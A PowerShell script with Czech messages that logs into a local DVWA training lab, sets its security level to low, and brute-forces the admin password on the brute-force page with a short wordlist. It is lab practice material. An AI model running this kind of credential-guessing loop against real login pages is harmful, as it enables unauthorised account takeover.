$baseUrl = "http://localhost/dvwa"
$loginUrl = "$baseUrl/login.php"
$targetUrl = "$baseUrl/vulnerabilities/brute/"

$dvwaUser = "admin"
$dvwaPass = "password"

$targetUsername = "admin"
$wordlist = @("123456", "password123", "admin", "root", "password", "tajne")

Write-Host "1. Navazuji spojení a přihlašuji se do DVWA..." -ForegroundColor Cyan

$initRequest = Invoke-WebRequest -Uri $loginUrl -SessionVariable "mojeSession" -UseBasicParsing

$token = $null
if ($initRequest.Content -match "name='user_token' value='([a-f0-9]+)'") {
    $token = $matches[1]
    Write-Host "   Nalezen user_token: $token" -ForegroundColor Gray
}

$loginBody = @{
    username = $dvwaUser
    password = $dvwaPass
    Login    = "Login"
}
if ($token) { $loginBody.Add("user_token", $token) }

try {
    $loginResponse = Invoke-WebRequest -Uri $loginUrl -WebSession $mojeSession -Method Post -Body $loginBody -UseBasicParsing
    Write-Host "   Přihlášení odesláno." -ForegroundColor Green
}
catch {
    Write-Error "Chyba při přihlašování: $_"
    exit
}

Write-Host "2. Nastavuji úroveň zabezpečení na 'low'..." -ForegroundColor Cyan

$cookie = New-Object Microsoft.PowerShell.Commands.WebRequestCookie
$cookie.Name = "security"
$cookie.Value = "low"
$cookie.Domain = "localhost" # Upravte, pokud běžíte na jiné IP/doméně

$mojeSession.Cookies.Add($cookie)

Write-Host "   Security cookie nastavena." -ForegroundColor Green

Write-Host " Zahajuji útok hrubou silou na: $targetUrl" -ForegroundColor Magenta
Write-Host "------------------------------------------------"

foreach ($password in $wordlist) {
    $attackUri = "$targetUrl?username=$targetUsername&password=$password&Login=Login"

    try {
        $response = Invoke-WebRequest -Uri $attackUri -WebSession $mojeSession -Method Get -UseBasicParsing
        
        if ($response.Content -match "Username and/or password incorrect") {
            Write-Host "[-] Neúspěch: $password" -ForegroundColor Gray
        }
        else {
            Write-Host "[+] HESLO NALEZENO: $password" -ForegroundColor Green -BackgroundColor Black
            Write-Host "   (Délka odpovědi: $($response.Content.Length) znaků)"
            
            break
        }
    }
    catch {
        Write-Host "[!] Chyba při požadavku: $_" -ForegroundColor Red
    }
    
        Start-Sleep -Milliseconds 100
}

Write-Host "------------------------------------------------"
Write-Host "Dokončeno."
